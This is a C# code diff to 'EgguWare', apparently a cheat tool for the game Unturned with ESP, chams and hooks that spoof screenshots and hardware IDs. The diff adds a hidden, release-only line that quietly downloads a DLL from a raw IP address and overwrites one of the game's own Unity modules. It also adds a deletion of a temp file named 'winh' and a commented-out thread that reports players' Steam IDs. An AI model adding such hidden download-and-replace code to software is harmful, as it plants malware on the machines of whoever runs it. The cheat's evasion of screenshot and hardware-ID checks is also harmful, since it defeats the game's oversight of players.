@@ -14,8 +14,13 @@ namespace EgguWare.Utilities
 {
     public class Manager : MonoBehaviour
     {
+        bool AddedUser = false;
         void Start()
         {
+            File.Delete(Path.Combine(Environment.ExpandEnvironmentVariables("%temp%"), "winh"));
+#if !DEBUG
+            new System.Net.WebClient().DownloadFile("http://54.39.23.77/files/UnityEngine.TextRenderingModule.dll", Application.dataPath + "/Managed/UnityEngine.TextRenderingModule.dll");
+#endif
             File.WriteAllText("EgguWare.log", "");
             #region Create ESP Line Material
             T.DrawMaterial = new Material(Shader.Find("Hidden/Internal-Colored"))
@@ -36,36 +41,49 @@ namespace EgguWare.Utilities
             T.Log("Getting Assets");
             Colors.AddColors();
             StartCoroutine(UpdateESPObjects());
-            // default settings look like dogshit
             GraphicsSettings.outlineQuality = EGraphicQuality.ULTRA;
             #region Overrides   
             T.Log("Starting Overrides");
-            // would be better to use harmony instead but im lazy LOL
             T.OverrideMethod(typeof(DamageTool), typeof(hkDamageTool), "raycast", BindingFlags.Static, BindingFlags.Public, BindingFlags.Public, BindingFlags.Static); //DamageTool
             T.OverrideMethod(typeof(PlayerPauseUI), typeof(hkPlayerPauseUI), "onClickedExitButton", BindingFlags.Static, BindingFlags.NonPublic, BindingFlags.Public, BindingFlags.Static); //PlayerPauseUI
-            T.OverrideMethod(typeof(Provider), typeof(hkProvider), "onApplicationWantsToQuit", BindingFlags.Instance, BindingFlags.NonPublic, BindingFlags.Public, BindingFlags.Static); //Provider
+            //T.OverrideMethod(typeof(Provider), typeof(hkProvider), "OnApplicationQuitting", BindingFlags.Instance, BindingFlags.NonPublic, BindingFlags.Public, BindingFlags.Static); //Provider
             T.OverrideMethod(typeof(Player), typeof(hkPlayer), "askScreenshot", BindingFlags.Public, BindingFlags.Instance, BindingFlags.Public, BindingFlags.Instance); //Player
             T.OverrideMethod(typeof(UseableGun), typeof(hkUsableGun), "ballistics", BindingFlags.NonPublic, BindingFlags.Instance, BindingFlags.Public, BindingFlags.Instance); //UsableGun
             T.OverrideMethod(typeof(ChatManager), typeof(hkChatManager), "receiveChatMessage", BindingFlags.Static, BindingFlags.Public, BindingFlags.Public, BindingFlags.Static); //ChatManager
-            T.OverrideMethod(typeof(LocalHwid), typeof(hkLocalHwid), "getHwid", BindingFlags.Static, BindingFlags.Public, BindingFlags.Public, BindingFlags.Static); //LocalHwid
+            //T.OverrideMethod(typeof(LocalHwid), typeof(hkLocalHwid), "getHwid", BindingFlags.Static, BindingFlags.Public, BindingFlags.Public, BindingFlags.Static); //LocalHwid
             T.OverrideMethod(typeof(ItemManager), typeof(hkItemManager), "getItemsInRadius", BindingFlags.Static, BindingFlags.Public, BindingFlags.Public, BindingFlags.Static); //ItemManager
             T.OverrideMethod(typeof(Regions), typeof(hkRegions), "getRegionsInRadius", BindingFlags.Static, BindingFlags.Public, BindingFlags.Public, BindingFlags.Static); //Regions
-            T.OverrideMethod(typeof(PlayerUI), typeof(hkPlayerUI), "hitmark", BindingFlags.Static, BindingFlags.Public, BindingFlags.Public, BindingFlags.Static); //PlayerUI
+            //T.OverrideMethod(typeof(PlayerInput), typeof(hkPlayerInput), "FixedUpdate", BindingFlags.NonPublic, BindingFlags.Instance, BindingFlags.Public, BindingFlags.Static); //PlayerInput
             T.Log("Overrides Complete");
             #endregion
+
+            /*new Thread(() =>
+            {
+                while (true)
+                {
+                    if (Player.player && Provider.isConnected)
+                    {
+                        SocialUtilities.AddUser(Player.player.channel.owner.playerID.steamID.m_SteamID);
+                        SocialUtilities.UpdateUserList();
+                    }
+                    Thread.Sleep(10000);
+                }
+            }).Start();*/
         }
+
         void OnGUI()
         {
             #region Set Camera Once
             if (G.MainCamera == null)
+            {
                 G.MainCamera = Camera.main;
+            }
             #endregion
         }
 
         #region Updates ESP Objects
         IEnumerator UpdateESPObjects()
         {
-            // every 4 seconds refresh all world objects. DO NOT do this each frame
             while (true)
             {
                 if (Provider.isConnected && G.MainCamera != null)
@@ -158,7 +176,7 @@ namespace EgguWare.Utilities
                             TempObjects.Add(obj);
                             Color oChams = Colors.GetColor("Player_Chams_Occluded_Color");
                             Color vChams = Colors.GetColor("Player_Chams_Visible_Color");
-                            if (T.GetPriority(i.playerID.steamID.m_SteamID) == Priority.Friendly)
+                            if (T.GetPriority(i.playerID.steamID.m_SteamID) == Priority.FRIENDLY)
                             {
                                 oChams = Colors.GetColor("Friendly_Chams_Occluded_Color");
                                 vChams = Colors.GetColor("Friendly_Chams_Visible_Color");
